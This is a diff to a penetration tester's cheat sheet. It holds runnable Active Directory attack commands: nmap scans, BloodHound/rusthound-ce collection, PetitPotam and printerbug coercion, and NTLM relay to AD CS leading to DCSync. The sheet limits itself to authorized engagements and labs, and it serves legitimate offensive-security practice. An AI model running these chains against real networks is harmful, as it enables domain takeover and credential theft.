@@ -14,13 +14,26 @@ entries/red/), which is canonical for them — edit the entry and run
 offensive/companion/gen-views.sh, not the lines here (CI rejects a hand-edit).
 Everything outside the markers is hand-authored as usual.
 
-Not every red corpus entry is projected here, and that asymmetry is DELIBERATE:
-the companion is the red<->blue PAIRING anchor (its blue twin projects cleanly into
-PURPLE-TEAM.md because a detection carries no extra field context), but several red
-attacks live here as hand-authored prose instead — a fuller field reference than the
-bare corpus command, with the sharper token (`<dc-ip>` not the projected `<ip_address>`),
-inline pedagogy, and follow-up steps the entry omits. So a red entry WITHOUT a
-`# companion:gen` block here is projecting-by-omission on purpose, not missing.
+Most of the corpus is NOT projected here — 18 of its 92 red entries are (23 of 90
+blue in PURPLE-TEAM.md). That's deliberate, for two different reasons:
+
+  1. The projected slice is the on-prem AD/Windows OVERLAP, and even inside it some
+     entries stay unprojected because the prose here is the richer superset — the
+     sharper token (`<dc-ip>` not the projected `<ip_address>`), inline pedagogy, and
+     follow-up chain steps the entry omits. adcs-esc1-certipy, coerce-petitpotam,
+     ntlm-relay-ntlmrelayx, pth-lateral-nxc, smb-enum-nxc, rdp-hijack-tscon and
+     reverse-tunnel-chisel are all covered that way, better, below.
+  2. The corpus is a deliberate SUPERSET: ~55 red entries are cloud / SaaS / CI-CD
+     (AWS, Entra, GCP, Okta, Snowflake, k8s, Jenkins, GitHub/GitLab, npm/PyPI, Vault,
+     Terraform Cloud) and ~12 more are C2-egress / Impact. Those have NO counterpart
+     here and never will — this file is organized per-service / per-port, and cloud
+     has no port. Read that half with `htpx` (~/companion), which pairs each attack
+     beside its detection. Same on the blue side: PURPLE-TEAM.md is the Windows
+     Security / Sysmon mirror, so the cloud-audit-log detections live only in the
+     corpus too.
+
+So an unprojected red entry is either richer prose here (1) or corpus-only tradecraft
+this file doesn't cover (2) — not a gap in the generator.
 
 SCOPE: authorized engagements (written ROE + scope) or your own CTF/HTB labs ONLY.
 Engagement DATA lives in ~/engagements (`mkengagement`), never in this repo.
@@ -37,7 +50,9 @@ Target fill — set your box once, then every <placeholder> is real. vim macro:
 
 Scanning
 ++++++++++++++++++++++++++++++++++++++++
-# Quick+thorough TCP, then targeted. (`nmapsweep` wraps #1.)
+# Quick+thorough TCP, then targeted. (`nmapsweep <target>` is the helper's own take on
+# #1 — `nmap -sCV -T4 -oA nmap/<target>`: unprivileged, so TCP-connect not SYN, and it
+# writes into ./nmap/ rather than the <hostname>_N-* naming below. Not a wrapper.)
 sudo nmap -sC -sV -oA <hostname>_1-initial <ip_address>
 sudo nmap -sC -sV -sU -oA <hostname>_2-udp <ip_address>
 sudo nmap -p- -T4 --min-rate 10000 -oA <hostname>_3-tcp-discovery <ip_address>
@@ -329,6 +344,9 @@ bhce <ip_address> <user> <password> <domain>
 nxc ldap <ip_address> -u <user> -p <password> --bloodhound --collection All --dns-server <ip_address>
 # bloodhound-python here is the CE collector from the `bloodhound-ce-python` pkg — NOT the legacy 'bloodhound.py':
 bloodhound-python -u <user> -p <password> -d <domain> -ns <ip_address> -c All
+# rusthound-ce is the fast ALTERNATE collector on a large domain — one static Rust binary,
+# no Python chain. UPSTREAM (`cargo install rusthound-ce`), not apt; complement, not replacement:
+rusthound-ce -d <domain> -u <user>@<domain> -p <password> --dc <ip_address> -z
 
 # Escalation primitives: AS-REP / Kerberoast (above) / unconstrained-deleg / GenericAll / DCSync.
 certipy-ad find -u <user>@<domain> -p <password> -dc-ip <ip_address> -vulnerable  # AD CS (ESC1–ESC17)
@@ -390,9 +408,12 @@ proxychains nxc smb <ip_address>                                   # ride the re
 Coercion -> relay -> domain compromise
 ++++++++++++++++++++++++++++++++++++++++
 # Force a machine (ideally a DC) to auth to you, then relay it:
-impacket-petitpotam <your-ip> <dc-ip>                       # MS-EFSRPC (EfsRpcOpenFileRaw)
-printerbug <domain>/<user>:<password>@<dc-ip> <your-ip>     # MS-RPRN spooler (Dementor); apt `krbrelayx` installs it as `printerbug` (no .py). coercer (below) is the apt-native multi-vector alt
-coercer coerce -t <dc-ip> -l <your-ip> -u <user> -p <password> -d <domain>   # many vectors
+# There is NO `impacket-petitpotam` — impacket-scripts ships no petitpotam, and Kali has
+# no petitpotam package either. coercer's method filter IS the PetitPotam vector; the
+# original PoC is a git clone (github.com/topotam/PetitPotam) if you want it verbatim.
+coercer coerce -t <dc-ip> -l <your-ip> -u <user> -p <password> -d <domain> --filter-method-name EfsRpcOpenFileRaw   # MS-EFSRPC = PetitPotam
+printerbug <domain>/<user>:<password>@<dc-ip> <your-ip>     # MS-RPRN spooler (Dementor); apt `krbrelayx` installs it as `printerbug` (no .py)
+coercer coerce -t <dc-ip> -l <your-ip> -u <user> -p <password> -d <domain>   # unfiltered — every known vector
 # Relay coerced DC auth to AD CS web enrollment -> DC cert (dirkjanm relay-to-ADCS):
 impacket-ntlmrelayx -t http://<ca-host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 # DC cert -> DC NT hash via PKINIT, then DCSync:
@@ -608,6 +629,10 @@ Reference
 # PayloadsAllTheThings                           (revshells, injections — many already in /usr/share)
 #
 # Companion references in this repo (different altitudes):
+#   ~/companion   (`htpx`)  the structured red<->blue corpus: pick an ATT&CK-tagged attack, preview its
+#                           detection beside it, fill the {{slots}}, `clip`. Source of truth for the
+#                           `# companion:gen` blocks above — and the ONLY place the cloud / SaaS /
+#                           CI-CD and C2-egress / Impact tradecraft lives (see the header)
 #   ~/ippsec      (`ipp`)   THE METHOD: recon loop, shell stabilization, pseudo-shell, unsticking playbook
 #   ~/exploitdev  (`xdev`)  binary exploitation: BOF/SEH/egghunter/ROP
 #   ~/evasion     (`evade`) AV/AMSI/AppLocker evasion, client-side, injection
